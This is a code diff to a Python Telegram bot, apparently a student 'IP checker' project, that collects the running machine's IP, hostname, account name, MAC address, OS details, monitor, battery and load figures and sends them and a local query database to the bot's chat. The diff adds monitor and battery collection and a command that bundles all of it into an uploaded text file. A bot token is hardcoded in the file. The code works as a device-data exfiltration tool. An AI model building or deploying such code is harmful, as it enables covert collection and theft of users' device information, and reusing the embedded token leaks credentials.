@@ -12,14 +12,21 @@ import telebot
 from uuid import getnode as get_mac
 import psutil
 import os
+from screeninfo import get_monitors
+
+
 
 bot = telebot.TeleBot("6585195657:AAF1FpTNNpBv_Uhxpro9buwSIR00RQ5pvKQ")
+
+monitors = get_monitors()
 
 mac = get_mac()
 
 my_system = platform.uname()
 
 n = socket.gethostname()
+
+battery_info = psutil.sensors_battery()
 
 s = requests.get('https://2ip.ua/ru/')
 
@@ -33,13 +40,12 @@ connection = sqlite3.connect("ip.sl3", 5)
 
 cur = connection.cursor()
 
-
+for monitor in monitors:
+    pass
 
 cpu_percent = psutil.cpu_percent(interval=1)
-print("Загрузка ЦП:", cpu_percent)
 
 memory_info = psutil.virtual_memory()
-print("Используемая память:", memory_info.percent)
 
 
 
@@ -91,7 +97,7 @@ def get_info_by_ip(ip='127.0.0.1'):
             print(f'{k} : {v}')
 
         area = folium.Map(location=[response.get('lat'), response.get('lon')])
-        area.save('ip.html')
+        area.save(f'{response.get("query")}_{response.get("city")}.html')
 
     except requests.exceptions.ConnectionError:
         print('[!] Please check your connection!')
@@ -158,22 +164,29 @@ def main():
             elif get_message_text(upd).lower() == "/name":
                 send_message(get_chat_id(upd),
                              f"Ім'я облікового запису клієнта: {d_n}")
+            elif get_message_text(upd).lower() == "/monitor":
+                send_message(get_chat_id(upd),
+                             f"Монітор: {monitor.width}x{monitor.height}")
             elif get_message_text(upd).lower() == "/mac":
                 send_message(get_chat_id(upd),
                              f"MAC-адрес клієнта: {mac}")
-            elif get_message_text(upd).lower() == "/geodel":
-                os.remove("ip.html")
+            elif get_message_text(upd).lower() == "/infotxt":
                 send_message(get_chat_id(upd),
-                             "Всі геолокації було видалено")
-            elif get_message_text(upd).lower() == "/geo":
-                send_message(get_chat_id(upd),
-                             "Геолокація запиту клієнта:")
-                upfile_2 = open("ip.html", "rb")
-                bot.send_document(get_chat_id(upd), upfile_2)
-                upfile_2.close()
+                             "Всі дані про клієнта в .txt форматі:")
+                file = open("info.txt", "w")
+                file.write(
+                    f"[================================================]\n IP клієнта: {a}\n Запит клієнта: {ip}\n Ім'я пристрою клієнта: {n}\n Ім'я облікового запису клієнта: {d_n}\n ОС: {my_system.system}\n Реліз ОС: {my_system.release}\n Версія: {my_system.version}\n Процессор: {my_system.processor}\n Монітор: {monitor.width}x{monitor.height}\n Інформація про батарею: {battery_info}\n Машина: {my_system.machine}\n MAC-адрес клієнта: {mac}\n Завантаженість ЦП: {cpu_percent}\n Завантаженість пам'яті: {memory_info.percent}\n[================================================]\n")  # Пишем
+                file.close()
+                upfile = open("info.txt", "rb")
+                bot.send_document(get_chat_id(upd), upfile)
+                upfile.close()
+                os.remove("info.txt")
             elif get_message_text(upd).lower() == "/site":
                 send_message(get_chat_id(upd),
                              "Сайт програми: https://sites.google.com/view/ip-checker-itstep")
+            elif get_message_text(upd).lower() == "/battery":
+                send_message(get_chat_id(upd),
+                             f"Інформація про батарею: {battery_info}")
             elif get_message_text(upd).lower() == "/allinfo":
                 send_message(get_chat_id(upd),
                              f"IP клієнта: {a}")
@@ -192,6 +205,10 @@ def main():
                 send_message(get_chat_id(upd),
                              f"Процессор: {my_system.processor}")
                 send_message(get_chat_id(upd),
+                             f"Монітор: {monitor.width}x{monitor.height}"),
+                send_message(get_chat_id(upd),
+                             f"Інформація про батарею: {battery_info}"),
+                send_message(get_chat_id(upd),
                              f"Машина: {my_system.machine}")
                 send_message(get_chat_id(upd),
                              f"MAC-адрес клієнта: {mac}")
@@ -200,15 +217,20 @@ def main():
                 send_message(get_chat_id(upd),
                              f"Завантаженість пам'яті: {memory_info.percent}")
                 send_message(get_chat_id(upd),
-                             "Геолокація запиту клієнта:")
-                upfile_2 = open("ip.html", "rb")
-                bot.send_document(get_chat_id(upd), upfile_2)
-                upfile_2.close()
-                send_message(get_chat_id(upd),
                              f"База даних запитів з пристрою клієнта:")
                 upfile = open("ip.sl3", "rb")
                 bot.send_document(get_chat_id(upd), upfile)
                 upfile.close()
+                send_message(get_chat_id(upd),
+                             "Всі дані про клієнта в .txt форматі:")
+                file = open("info.txt", "w")
+                file.write(
+                    f"[================================================]\n IP клієнта: {a}\n Запит клієнта: {ip}\n Ім'я пристрою клієнта: {n}\n Ім'я облікового запису клієнта: {d_n}\n ОС: {my_system.system}\n Реліз ОС: {my_system.release}\n Версія: {my_system.version}\n Процессор: {my_system.processor}\n Монітор: {monitor.width}x{monitor.height}\n Інформація про батарею: {battery_info}\n Машина: {my_system.machine}\n MAC-адрес клієнта: {mac}\n Завантаженість ЦП: {cpu_percent}\n Завантаженість пам'яті: {memory_info.percent}\n[================================================]\n")  # Пишем
+                file.close()
+                upfile_3 = open("info.txt", "rb")
+                bot.send_document(get_chat_id(upd), upfile_3)
+                upfile_3.close()
+                os.remove("info.txt")
             elif get_message_text(upd).lower() == "/data":
                 send_message(get_chat_id(upd),
                              f"База даних запитів з пристрою клієнта:")
@@ -221,7 +243,6 @@ def main():
                 send_message(get_chat_id(upd), "Я не знаю що мені робить :(")
             up_id += 1
         time.sleep(2)
-
 
 
 if __name__ == '__main__':
